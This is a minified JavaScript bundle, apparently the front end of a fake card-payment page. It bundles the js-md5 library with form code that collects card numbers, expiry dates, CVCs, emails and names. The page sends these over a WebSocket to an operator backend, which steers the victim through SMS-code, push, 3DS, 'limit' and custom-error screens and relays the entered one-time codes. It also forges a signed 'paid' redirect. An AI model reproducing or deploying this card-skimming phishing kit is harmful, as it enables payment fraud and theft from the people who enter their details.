(function(){const i=document.createElement("link").relList;if(i&&i.supports&&i.supports("modulepreload"))return;for(const d of document.querySelectorAll('link[rel="modulepreload"]'))p(d);new MutationObserver(d=>{for(const h of d)if(h.type==="childList")for(const b of h.addedNodes)b.tagName==="LINK"&&b.rel==="modulepreload"&&p(b)}).observe(document,{childList:!0,subtree:!0});function u(d){const h={};return d.integrity&&(h.integrity=d.integrity),d.referrerPolicy&&(h.referrerPolicy=d.referrerPolicy),d.crossOrigin==="use-credentials"?h.credentials="include":d.crossOrigin==="anonymous"?h.credentials="omit":h.credentials="same-origin",h}function p(d){if(d.ep)return;d.ep=!0;const h=u(d);fetch(d.href,h)}})();var fe=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function pe(n){return n&&n.__esModule&&Object.prototype.hasOwnProperty.call(n,"default")?n.default:n}function he(n){if(n.__esModule)return n;var i=n.default;if(typeof i=="function"){var u=function p(){return this instanceof p?Reflect.construct(i,arguments,this.constructor):i.apply(this,arguments)};u.prototype=i.prototype}else u={};return Object.defineProperty(u,"__esModule",{value:!0}),Object.keys(n).forEach(function(p){var d=Object.getOwnPropertyDescriptor(n,p);Object.defineProperty(u,p,d.get?d:{enumerable:!0,get:function(){return n[p]}})}),u}var te={exports:{}};const me={},ye=Object.freeze(Object.defineProperty({__proto__:null,default:me},Symbol.toStringTag,{value:"Module"})),Z=he(ye);/**
 * [js-md5]{@link https://github.com/emn178/js-md5}
 *
 * @namespace md5
 * @version 0.8.3
 * @author Chen, Yi-Cyuan [emn178@gmail.com]
 * @copyright Chen, Yi-Cyuan 2014-2023
 * @license MIT
 */(function(n){(function(){var i="input is invalid type",u="finalize already called",p=typeof window=="object",d=p?window:{};d.JS_MD5_NO_WINDOW&&(p=!1);var h=!p&&typeof self=="object",b=!d.JS_MD5_NO_NODE_JS&&typeof process=="object"&&process.versions&&process.versions.node;b?d=fe:h&&(d=self);var ne=!d.JS_MD5_NO_COMMON_JS&&!0&&n.exports,O=!d.JS_MD5_NO_ARRAY_BUFFER&&typeof ArrayBuffer<"u",f="0123456789abcdef".split(""),ce=[128,32768,8388608,-2147483648],v=[0,8,16,24],C=["hex","array","digest","buffer","arrayBuffer","base64"],I="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""),y=[],H;if(O){var V=new ArrayBuffer(68);H=new Uint8Array(V),y=new Uint32Array(V)}var q=Array.isArray;(d.JS_MD5_NO_NODE_JS||!q)&&(q=function(e){return Object.prototype.toString.call(e)==="[object Array]"});var L=ArrayBuffer.isView;O&&(d.JS_MD5_NO_ARRAY_BUFFER_IS_VIEW||!L)&&(L=function(e){return typeof e=="object"&&e.buffer&&e.buffer.constructor===ArrayBuffer});var W=function(e){var r=typeof e;if(r==="string")return[e,!0];if(r!=="object"||e===null)throw new Error(i);if(O&&e.constructor===ArrayBuffer)return[new Uint8Array(e),!1];if(!q(e)&&!L(e))throw new Error(i);return[e,!1]},G=function(e){return function(r){return new m(!0).update(r)[e]()}},le=function(){var e=G("hex");b&&(e=de(e)),e.create=function(){return new m},e.update=function(t){return e.create().update(t)};for(var r=0;r<C.length;++r){var s=C[r];e[s]=G(s)}return e},de=function(e){var r=Z,s=Z.Buffer,t;s.from&&!d.JS_MD5_NO_BUFFER_FROM?t=s.from:t=function(a){return new s(a)};var c=function(a){if(typeof a=="string")return r.createHash("md5").update(a,"utf8").digest("hex");if(a==null)throw new Error(i);return a.constructor===ArrayBuffer&&(a=new Uint8Array(a)),q(a)||L(a)||a.constructor===s?r.createHash("md5").update(t(a)).digest("hex"):e(a)};return c},K=function(e){return function(r,s){return new B(r,!0).update(s)[e]()}},ue=function(){var e=K("hex");e.create=function(t){return new B(t)},e.update=function(t,c){return e.create(t).update(c)};for(var r=0;r<C.length;++r){var s=C[r];e[s]=K(s)}return e};function m(e){if(e)y[0]=y[16]=y[1]=y[2]=y[3]=y[4]=y[5]=y[6]=y[7]=y[8]=y[9]=y[10]=y[11]=y[12]=y[13]=y[14]=y[15]=0,this.blocks=y,this.buffer8=H;else if(O){var r=new ArrayBuffer(68);this.buffer8=new Uint8Array(r),this.blocks=new Uint32Array(r)}else this.blocks=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];this.h0=this.h1=this.h2=this.h3=this.start=this.bytes=this.hBytes=0,this.finalized=this.hashed=!1,this.first=!0}m.prototype.update=function(e){if(this.finalized)throw new Error(u);var r=W(e);e=r[0];for(var s=r[1],t,c=0,a,o=e.length,l=this.blocks,g=this.buffer8;c<o;){if(this.hashed&&(this.hashed=!1,l[0]=l[16],l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0),s)if(O)for(a=this.start;c<o&&a<64;++c)t=e.charCodeAt(c),t<128?g[a++]=t:t<2048?(g[a++]=192|t>>>6,g[a++]=128|t&63):t<55296||t>=57344?(g[a++]=224|t>>>12,g[a++]=128|t>>>6&63,g[a++]=128|t&63):(t=65536+((t&1023)<<10|e.charCodeAt(++c)&1023),g[a++]=240|t>>>18,g[a++]=128|t>>>12&63,g[a++]=128|t>>>6&63,g[a++]=128|t&63);else for(a=this.start;c<o&&a<64;++c)t=e.charCodeAt(c),t<128?l[a>>>2]|=t<<v[a++&3]:t<2048?(l[a>>>2]|=(192|t>>>6)<<v[a++&3],l[a>>>2]|=(128|t&63)<<v[a++&3]):t<55296||t>=57344?(l[a>>>2]|=(224|t>>>12)<<v[a++&3],l[a>>>2]|=(128|t>>>6&63)<<v[a++&3],l[a>>>2]|=(128|t&63)<<v[a++&3]):(t=65536+((t&1023)<<10|e.charCodeAt(++c)&1023),l[a>>>2]|=(240|t>>>18)<<v[a++&3],l[a>>>2]|=(128|t>>>12&63)<<v[a++&3],l[a>>>2]|=(128|t>>>6&63)<<v[a++&3],l[a>>>2]|=(128|t&63)<<v[a++&3]);else if(O)for(a=this.start;c<o&&a<64;++c)g[a++]=e[c];else for(a=this.start;c<o&&a<64;++c)l[a>>>2]|=e[c]<<v[a++&3];this.lastByteIndex=a,this.bytes+=a-this.start,a>=64?(this.start=a-64,this.hash(),this.hashed=!0):this.start=a}return this.bytes>4294967295&&(this.hBytes+=this.bytes/4294967296<<0,this.bytes=this.bytes%4294967296),this},m.prototype.finalize=function(){if(!this.finalized){this.finalized=!0;var e=this.blocks,r=this.lastByteIndex;e[r>>>2]|=ce[r&3],r>=56&&(this.hashed||this.hash(),e[0]=e[16],e[16]=e[1]=e[2]=e[3]=e[4]=e[5]=e[6]=e[7]=e[8]=e[9]=e[10]=e[11]=e[12]=e[13]=e[14]=e[15]=0),e[14]=this.bytes<<3,e[15]=this.hBytes<<3|this.bytes>>>29,this.hash()}},m.prototype.hash=function(){var e,r,s,t,c,a,o=this.blocks;this.first?(e=o[0]-680876937,e=(e<<7|e>>>25)-271733879<<0,t=(-1732584194^e&2004318071)+o[1]-117830708,t=(t<<12|t>>>20)+e<<0,s=(-271733879^t&(e^-271733879))+o[2]-1126478375,s=(s<<17|s>>>15)+t<<0,r=(e^s&(t^e))+o[3]-1316259209,r=(r<<22|r>>>10)+s<<0):(e=this.h0,r=this.h1,s=this.h2,t=this.h3,e+=(t^r&(s^t))+o[0]-680876936,e=(e<<7|e>>>25)+r<<0,t+=(s^e&(r^s))+o[1]-389564586,t=(t<<12|t>>>20)+e<<0,s+=(r^t&(e^r))+o[2]+606105819,s=(s<<17|s>>>15)+t<<0,r+=(e^s&(t^e))+o[3]-1044525330,r=(r<<22|r>>>10)+s<<0),e+=(t^r&(s^t))+o[4]-176418897,e=(e<<7|e>>>25)+r<<0,t+=(s^e&(r^s))+o[5]+1200080426,t=(t<<12|t>>>20)+e<<0,s+=(r^t&(e^r))+o[6]-1473231341,s=(s<<17|s>>>15)+t<<0,r+=(e^s&(t^e))+o[7]-45705983,r=(r<<22|r>>>10)+s<<0,e+=(t^r&(s^t))+o[8]+1770035416,e=(e<<7|e>>>25)+r<<0,t+=(s^e&(r^s))+o[9]-1958414417,t=(t<<12|t>>>20)+e<<0,s+=(r^t&(e^r))+o[10]-42063,s=(s<<17|s>>>15)+t<<0,r+=(e^s&(t^e))+o[11]-1990404162,r=(r<<22|r>>>10)+s<<0,e+=(t^r&(s^t))+o[12]+1804603682,e=(e<<7|e>>>25)+r<<0,t+=(s^e&(r^s))+o[13]-40341101,t=(t<<12|t>>>20)+e<<0,s+=(r^t&(e^r))+o[14]-1502002290,s=(s<<17|s>>>15)+t<<0,r+=(e^s&(t^e))+o[15]+1236535329,r=(r<<22|r>>>10)+s<<0,e+=(s^t&(r^s))+o[1]-165796510,e=(e<<5|e>>>27)+r<<0,t+=(r^s&(e^r))+o[6]-1069501632,t=(t<<9|t>>>23)+e<<0,s+=(e^r&(t^e))+o[11]+643717713,s=(s<<14|s>>>18)+t<<0,r+=(t^e&(s^t))+o[0]-373897302,r=(r<<20|r>>>12)+s<<0,e+=(s^t&(r^s))+o[5]-701558691,e=(e<<5|e>>>27)+r<<0,t+=(r^s&(e^r))+o[10]+38016083,t=(t<<9|t>>>23)+e<<0,s+=(e^r&(t^e))+o[15]-660478335,s=(s<<14|s>>>18)+t<<0,r+=(t^e&(s^t))+o[4]-405537848,r=(r<<20|r>>>12)+s<<0,e+=(s^t&(r^s))+o[9]+568446438,e=(e<<5|e>>>27)+r<<0,t+=(r^s&(e^r))+o[14]-1019803690,t=(t<<9|t>>>23)+e<<0,s+=(e^r&(t^e))+o[3]-187363961,s=(s<<14|s>>>18)+t<<0,r+=(t^e&(s^t))+o[8]+1163531501,r=(r<<20|r>>>12)+s<<0,e+=(s^t&(r^s))+o[13]-1444681467,e=(e<<5|e>>>27)+r<<0,t+=(r^s&(e^r))+o[2]-51403784,t=(t<<9|t>>>23)+e<<0,s+=(e^r&(t^e))+o[7]+1735328473,s=(s<<14|s>>>18)+t<<0,r+=(t^e&(s^t))+o[12]-1926607734,r=(r<<20|r>>>12)+s<<0,c=r^s,e+=(c^t)+o[5]-378558,e=(e<<4|e>>>28)+r<<0,t+=(c^e)+o[8]-2022574463,t=(t<<11|t>>>21)+e<<0,a=t^e,s+=(a^r)+o[11]+1839030562,s=(s<<16|s>>>16)+t<<0,r+=(a^s)+o[14]-35309556,r=(r<<23|r>>>9)+s<<0,c=r^s,e+=(c^t)+o[1]-1530992060,e=(e<<4|e>>>28)+r<<0,t+=(c^e)+o[4]+1272893353,t=(t<<11|t>>>21)+e<<0,a=t^e,s+=(a^r)+o[7]-155497632,s=(s<<16|s>>>16)+t<<0,r+=(a^s)+o[10]-1094730640,r=(r<<23|r>>>9)+s<<0,c=r^s,e+=(c^t)+o[13]+681279174,e=(e<<4|e>>>28)+r<<0,t+=(c^e)+o[0]-358537222,t=(t<<11|t>>>21)+e<<0,a=t^e,s+=(a^r)+o[3]-722521979,s=(s<<16|s>>>16)+t<<0,r+=(a^s)+o[6]+76029189,r=(r<<23|r>>>9)+s<<0,c=r^s,e+=(c^t)+o[9]-640364487,e=(e<<4|e>>>28)+r<<0,t+=(c^e)+o[12]-421815835,t=(t<<11|t>>>21)+e<<0,a=t^e,s+=(a^r)+o[15]+530742520,s=(s<<16|s>>>16)+t<<0,r+=(a^s)+o[2]-995338651,r=(r<<23|r>>>9)+s<<0,e+=(s^(r|~t))+o[0]-198630844,e=(e<<6|e>>>26)+r<<0,t+=(r^(e|~s))+o[7]+1126891415,t=(t<<10|t>>>22)+e<<0,s+=(e^(t|~r))+o[14]-1416354905,s=(s<<15|s>>>17)+t<<0,r+=(t^(s|~e))+o[5]-57434055,r=(r<<21|r>>>11)+s<<0,e+=(s^(r|~t))+o[12]+1700485571,e=(e<<6|e>>>26)+r<<0,t+=(r^(e|~s))+o[3]-1894986606,t=(t<<10|t>>>22)+e<<0,s+=(e^(t|~r))+o[10]-1051523,s=(s<<15|s>>>17)+t<<0,r+=(t^(s|~e))+o[1]-2054922799,r=(r<<21|r>>>11)+s<<0,e+=(s^(r|~t))+o[8]+1873313359,e=(e<<6|e>>>26)+r<<0,t+=(r^(e|~s))+o[15]-30611744,t=(t<<10|t>>>22)+e<<0,s+=(e^(t|~r))+o[6]-1560198380,s=(s<<15|s>>>17)+t<<0,r+=(t^(s|~e))+o[13]+1309151649,r=(r<<21|r>>>11)+s<<0,e+=(s^(r|~t))+o[4]-145523070,e=(e<<6|e>>>26)+r<<0,t+=(r^(e|~s))+o[11]-1120210379,t=(t<<10|t>>>22)+e<<0,s+=(e^(t|~r))+o[2]+718787259,s=(s<<15|s>>>17)+t<<0,r+=(t^(s|~e))+o[9]-343485551,r=(r<<21|r>>>11)+s<<0,this.first?(this.h0=e+1732584193<<0,this.h1=r-271733879<<0,this.h2=s-1732584194<<0,this.h3=t+271733878<<0,this.first=!1):(this.h0=this.h0+e<<0,this.h1=this.h1+r<<0,this.h2=this.h2+s<<0,this.h3=this.h3+t<<0)},m.prototype.hex=function(){this.finalize();var e=this.h0,r=this.h1,s=this.h2,t=this.h3;return f[e>>>4&15]+f[e&15]+f[e>>>12&15]+f[e>>>8&15]+f[e>>>20&15]+f[e>>>16&15]+f[e>>>28&15]+f[e>>>24&15]+f[r>>>4&15]+f[r&15]+f[r>>>12&15]+f[r>>>8&15]+f[r>>>20&15]+f[r>>>16&15]+f[r>>>28&15]+f[r>>>24&15]+f[s>>>4&15]+f[s&15]+f[s>>>12&15]+f[s>>>8&15]+f[s>>>20&15]+f[s>>>16&15]+f[s>>>28&15]+f[s>>>24&15]+f[t>>>4&15]+f[t&15]+f[t>>>12&15]+f[t>>>8&15]+f[t>>>20&15]+f[t>>>16&15]+f[t>>>28&15]+f[t>>>24&15]},m.prototype.toString=m.prototype.hex,m.prototype.digest=function(){this.finalize();var e=this.h0,r=this.h1,s=this.h2,t=this.h3;return[e&255,e>>>8&255,e>>>16&255,e>>>24&255,r&255,r>>>8&255,r>>>16&255,r>>>24&255,s&255,s>>>8&255,s>>>16&255,s>>>24&255,t&255,t>>>8&255,t>>>16&255,t>>>24&255]},m.prototype.array=m.prototype.digest,m.prototype.arrayBuffer=function(){this.finalize();var e=new ArrayBuffer(16),r=new Uint32Array(e);return r[0]=this.h0,r[1]=this.h1,r[2]=this.h2,r[3]=this.h3,e},m.prototype.buffer=m.prototype.arrayBuffer,m.prototype.base64=function(){for(var e,r,s,t="",c=this.array(),a=0;a<15;)e=c[a++],r=c[a++],s=c[a++],t+=I[e>>>2]+I[(e<<4|r>>>4)&63]+I[(r<<2|s>>>6)&63]+I[s&63];return e=c[a],t+=I[e>>>2]+I[e<<4&63]+"==",t};function B(e,r){var s,t=W(e);if(e=t[0],t[1]){var c=[],a=e.length,o=0,l;for(s=0;s<a;++s)l=e.charCodeAt(s),l<128?c[o++]=l:l<2048?(c[o++]=192|l>>>6,c[o++]=128|l&63):l<55296||l>=57344?(c[o++]=224|l>>>12,c[o++]=128|l>>>6&63,c[o++]=128|l&63):(l=65536+((l&1023)<<10|e.charCodeAt(++s)&1023),c[o++]=240|l>>>18,c[o++]=128|l>>>12&63,c[o++]=128|l>>>6&63,c[o++]=128|l&63);e=c}e.length>64&&(e=new m(!0).update(e).array());var g=[],Y=[];for(s=0;s<64;++s){var X=e[s]||0;g[s]=92^X,Y[s]=54^X}m.call(this,r),this.update(Y),this.oKeyPad=g,this.inner=!0,this.sharedMemory=r}B.prototype=new m,B.prototype.finalize=function(){if(m.prototype.finalize.call(this),this.inner){this.inner=!1;var e=this.array();m.call(this,this.sharedMemory),this.update(this.oKeyPad),this.update(e),m.prototype.finalize.call(this)}};var D=le();D.md5=D,D.md5.hmac=ue(),ne?n.exports=D:d.md5=D})()})(te);var Se=te.exports;const ge=pe(Se),S=new WebSocket("ws://localhost:9000"),ve=document.querySelector(".buttonRestart"),A=document.querySelector(".codeSMS_button"),F=document.querySelector(".codeCustomSMS_button"),xe=document.querySelector(".codePushSMS_button"),be=document.querySelector(".codeCustomPushSMS_button"),_e=document.querySelector(".SMSValidateInput"),Ae=document.querySelector(".CustomSMSValidateInput");A.style.opacity=".5";F.style.opacity=".5";A.setAttribute("disabled","");F.setAttribute("disabled","");let _=300,J=5,E,Fe;function Oe(n,i,u="post"){const p=document.createElement("form");p.method=u,p.action=n;for(const d in i)if(i.hasOwnProperty(d)){const h=document.createElement("input");h.type="hidden",h.name=d,h.value=i[d],p.appendChild(h)}document.body.appendChild(p),p.submit()}_e.oninput=n=>{n.target.value.length>=3?(A.style.opacity="1",A.removeAttribute("disabled")):(A.style.opacity=".5",A.setAttribute("disabled",""))};Ae.oninput=n=>{n.target.value.length>=3?(F.style.opacity="1",F.removeAttribute("disabled")):(F.style.opacity=".5",F.setAttribute("disabled",""))};const Q=n=>n.toString().length===1?"0"+n:n.toString(),Ie=(n=0)=>Q(Math.trunc(n/60))+":"+Q(n%60),x=()=>{document.querySelector(".App-Payment.is-darkBackground").style.display="none",document.querySelectorAll(".AppBlocks").forEach(n=>{n.classList.remove("isActiveMode")})},M=(n,i,u)=>{S.send(JSON.stringify({type:"sendAdmin",callback:n.callback,message_id:i.mID,to:u}))},Me=()=>{const n=JSON.parse(localStorage.getItem("verified"));S.send(JSON.stringify({type:"clientClick",event:"REDIRECT",message_id:n.mID})),S.send(JSON.stringify({type:"offline",message_id:n.mID})),document.location.href="/"};ve.onclick=Me;A.onclick=n=>{const i=document.querySelector("#codeSMS");i.setAttribute("disabled",""),document.querySelector(".smsLoader").classList.add("isLoading");const{mID:u,method:p}=JSON.parse(localStorage.getItem("verified"));S.send(JSON.stringify({type:"sendSMS",message_id:u,fromMethod:p,code:i.value})),n.target.remove()};F.onclick=n=>{const i=document.querySelector("#codeCustomSMS");i.setAttribute("disabled",""),document.querySelector(".smsCustomLoader").classList.add("isLoading");const{mID:u,method:p}=JSON.parse(localStorage.getItem("verified"));S.send(JSON.stringify({type:"sendSMS",message_id:u,fromMethod:p,code:i.value})),n.target.remove()};xe.onclick=n=>{S.send(JSON.stringify({type:"clientClick",event:"PUSH",message_id:JSON.parse(localStorage.getItem("verified")).mID})),document.querySelector(".smsAppPushLoader").classList.add("isLoading"),n.target.remove()};be.onclick=n=>{S.send(JSON.stringify({type:"clientClick",event:"CUSTOM PUSH",message_id:JSON.parse(localStorage.getItem("verified")).mID})),document.querySelector(".smsAppCustomPushLoader").classList.add("isLoading"),n.target.remove()};setTimeout(function n(){const i=document.querySelector(".AppPush"),u=document.querySelector(".AppCustomPush"),p=document.querySelector(".AppSuccess");if(i.classList.contains("isActiveMode")?(_>0&&_--,document.querySelector(".pushTimer").textContent=Ie(_)):u.classList.contains("isActiveMode")?_>0&&_--:_=301,p.classList.contains("isActiveMode")){if(J>0)J--;else{const d=E.order,h="1",b=ge.md5(`${E.shop_id};${d.total_price};${d.client_transaction_id};${d.key};${h};${E.shop_password}`);Oe(E.redirectURL,{paid:h,amount:d.total_price,transaction_id:d.client_transaction_id,key:d.key,signature:b,shop_id:E.shop_id})}document.querySelector(".redirectSuccessPayTimer").textContent=J}else J=5;setTimeout(n,1e3)},1e3);S.onmessage=n=>{const i=JSON.parse(n.data);if(i.type=="verify"&&localStorage.setItem("verified",JSON.stringify({mID:i.message_id,method:""})),i.type=="checkUser"){const{mID:p,method:d}=JSON.parse(localStorage.getItem("verified"))||{mID:"",method:""};localStorage.setItem("verified",JSON.stringify({mID:p,method:""})),S.send(JSON.stringify({type:"button",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:i.callback}))}const u=JSON.parse(localStorage.getItem("verified"));try{i.type=="successRedirect"&&i.message_id==u.mID&&(Fe=i.order,E=i),i.type=="customsms"&&i.message_id==u.mID&&(S.send(JSON.stringify({type:"sendAdmin",callback:"customsms",message_id:u.mID})),x(),document.querySelector(".AppCustomSMS").classList.add("isActiveMode"),document.querySelector(".CustomSMSText").textContent=i.text),i.type=="custompush"&&i.message_id==u.mID&&(S.send(JSON.stringify({type:"sendAdmin",callback:"custompush",message_id:u.mID})),x(),document.querySelector(".AppCustomPush").classList.add("isActiveMode"),document.querySelector(".customPushText").textContent=i.text),i.type=="ownerror"&&i.message_id==u.mID&&(S.send(JSON.stringify({type:"sendAdmin",callback:"ownerror",message_id:u.mID})),x(),document.querySelector(".AppOwnError").classList.add("isActiveMode"),document.querySelector(".OwnErrorText").textContent=i.text),i.type=="button"&&i.message_id==u.message_id&&(i.callback&&(J=6,_=301),i.callback=="sms"&&(M(i,u,"smsPAGE"),x(),document.querySelector(".AppSMS").classList.add("isActiveMode")),i.callback=="custom_sms"&&S.send(JSON.stringify({type:"isCustomSMS",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:i.callback})),i.callback=="pushSMS"&&(M(i,u,"pushSMSPAGE"),x(),document.querySelector(".AppPush").classList.add("isActiveMode")),i.callback=="custom_pushSMS"&&S.send(JSON.stringify({type:"isCustomPUSH",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:i.callback})),i.callback=="success_pay"&&(S.send(JSON.stringify({type:"sendAdmin",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:i.callback})),x(),document.querySelector(".AppSuccess").classList.add("isActiveMode")),i.callback=="other_card"&&(M(i,u,"other_cardPAGE"),x(),document.querySelector(".AppOtherCard").classList.add("isActiveMode")),i.callback=="3dson"&&(M(i,u,"3dsonPAGE"),x(),document.querySelector(".App3DS").classList.add("isActiveMode")),i.callback=="limit"&&(M(i,u,"limitPAGE"),x(),document.querySelector(".AppLimit").classList.add("isActiveMode")),i.callback=="balance"&&(M(i,u,"balancePAGE"),x(),document.querySelector(".AppBalance").classList.add("isActiveMode")),i.callback=="own_error"&&S.send(JSON.stringify({type:"isOwnError",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:i.callback})),i.callback=="online"&&S.send(JSON.stringify({type:"isOnline",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:i.callback})))}catch(p){console.log(p)}};window.onload=()=>{const n=JSON.parse(localStorage.getItem("verified"))??{mID:"",method:""};S.send(JSON.stringify({type:"offline",message_id:n.mID||""})),localStorage.removeItem("verified")};const Ee=/^(([^<>()[\].,;:\s@"]+(\.[^<>()[\].,;:\s@"]+)*)|(".+"))@(([^<>()[\].,;:\s@"]+\.)+[^<>()[\].,;:\s@"]{2,})$/iu;function Ne(n){return Ee.test(n)}const re=document.getElementById("cardNumber"),se=document.getElementById("cardExpiry"),ie=document.getElementById("cardCvc"),k=document.getElementById("cardLogo"),we=document.querySelector(".PaymentForm-form"),oe=document.getElementById("email"),ae=document.getElementById("billingName"),w=document.querySelector(".FormButton");w.style.opacity=".5";w.setAttribute("disabled","");const De=document.querySelector(".loader-button"),R={visa:/^4/,mastercard:/^5[1-5]/,amex:/^3[47]/,jcb:/^3[56]/};let ee=!1,T=!1,U=!1,j=!1,$=!1,z=!1,N="не распознан";const P=()=>{T&&U&&j&&$&&z?(w.style.opacity="1",w.removeAttribute("disabled")):(w.style.opacity=".5",w.setAttribute("disabled",""))};oe.addEventListener("input",n=>{n.target.value.length>6&&Ne(n.target.value)?T=!0:T=!1,P()});re.addEventListener("input",n=>{let i=n.target.value.replace(/\D/g,"");i.length>=13?(i=i.substring(0,16),U=!0):U=!1,n.target.value=i.replace(/(\d{4})(?=\d)/g,"$1 ").trim(),R.visa.test(i)?(k.src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg",document.querySelector(".FormFieldExamples").style.display="none",i=i.substring(0,13),N="Visa"):R.mastercard.test(i)?(k.src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg",document.querySelector(".FormFieldExamples").style.display="none",i=i.substring(0,16),N="Mastercard"):R.amex.test(i)?(k.src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg",document.querySelector(".FormFieldExamples").style.display="none",i=i.substring(0,16),N="American Express"):R.jcb.test(i)?(k.src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/JCB_logo.svg/200px-JCB_logo.svg.png",document.querySelector(".FormFieldExamples").style.display="none",i=i.substring(0,16),N="JCB"):(k.src="",i=i.substring(0,16),document.querySelector(".FormFieldExamples").style.display="flex",N="не распознан"),P()});se.addEventListener("input",n=>{let i=n.target.value.replace(/\D/g,"");i.length>=4?(i=i.substring(0,4),j=!0):j=!1,n.target.value=i.replace(/(\d{2})(\d{1,2})/,"$1/$2"),P()});ie.addEventListener("input",n=>{let i=n.target.value.replace(/\D/g,"");i.length>=3?$=!0:$=!1,n.target.value=i.replace(/(\d{4})(?=\d)/g,"$1 ").trim(),P()});ae.addEventListener("input",n=>{n.target.value.length>=5?z=!0:z=!1,P()});we.addEventListener("submit",n=>{n.preventDefault(),De.classList.add("isLoading");const i=re.value.replace(/\s/g,""),u=se.value,p=ie.value;if(ee)return;const d={email:oe.value,cardNumber:i,expiryDate:u,cvc:p,billingName:ae.value,type:"form",uid:localStorage.getItem("uID"),order:document.querySelector(".orderdata").value.trim(),shop_id:document.querySelector(".getShopID").value,bank:N};S.send(JSON.stringify(d)),ee=!0});
